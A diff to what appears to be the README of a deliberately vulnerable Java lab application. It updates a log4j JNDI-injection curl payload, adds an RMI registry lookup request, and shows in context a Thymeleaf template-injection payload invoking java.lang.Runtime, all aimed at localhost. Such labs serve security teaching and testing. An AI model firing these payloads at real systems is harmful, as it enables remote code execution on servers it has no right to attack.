@@ -99,7 +99,13 @@ curl 'http://127.0.0.1:8080/thymeleaf/path?lang=__%24%7BT(java.lang.Runtime).get
 #### log4j漏洞
 
 ```
-curl 127.0.0.1:8080/log4j -d 'log=${jndi:ldap://127.0.0.1:1099/a}'
+curl 127.0.0.1:8080/log4j -d 'log=${jndi:ldap://127.0.0.1:1389/a}'
+```
+
+#### rmi client
+
+```
+curl 127.0.0.1:8080/registry/lookup -d 'ip=127.0.0.1&port=1099&name=MyService'
 ```
 
 #### jndi lookup
